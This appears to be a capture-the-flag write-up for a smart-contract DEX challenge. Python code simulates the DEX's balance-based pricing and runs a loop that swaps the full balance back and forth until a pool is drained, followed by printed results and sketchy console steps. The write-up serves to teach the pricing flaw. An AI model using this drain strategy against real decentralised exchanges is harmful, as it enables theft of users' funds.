#Challenge has a flaw in the DEX allowing the balance to be drained
#Draining illustrated by re-coding contract logic in python and running a simple attack strategy

Token1Me = 10
Token2Me = 10
Token1DEX = 100
Token2DEX = 100

def get_price(_from, _to, amt):
  rate = _to / _from
  return amt * rate 

def swap(_from, _to, amt):
  global Token1Me 
  global Token2Me 
  global Token1DEX 
  global Token2DEX
  if _from == 'Token1DEX':
    swap_amt = get_price(Token1DEX, Token2DEX, amt)
    Token1DEX += amt
    Token2DEX -= swap_amt 
    Token1Me -= amt 
    Token2Me += swap_amt 
  if _from == 'Token2DEX':
    swap_amt = get_price(Token2DEX, Token1DEX, amt)
    Token2DEX += amt
    Token1DEX -= swap_amt 
    Token2Me -= amt 
    Token1Me += swap_amt 

while Token1DEX > 0 and Token2DEX > 0:
  print(Token1Me, Token2Me, Token1DEX, Token2DEX)
  if Token1Me >= Token2Me:
    swap('Token1DEX', 'Token2DEX', Token1Me)
  else:
    swap('Token2DEX', 'Token1DEX', Token2Me)

# REULST:   
# 10 10 100 100
# 0 20.0 110 90.0
# 24.444444444444446 0.0 85.55555555555556 110.0
# 0.0 31.428571428571427 110.0 78.57142857142857
# 44.0 0.0 66.0 110.0
# 0.0 73.33333333333334 110.0 36.66666666666666

# In console
# let token1 = await contract.token1()
# let token2 = await contract.token2()
# approve spending
# await contract.balanceOf(token1, player) (
# Simply swap all of one token into another until draining the DEX
# Final drain of instance to 0 needs checking of instance balance, or swap will error
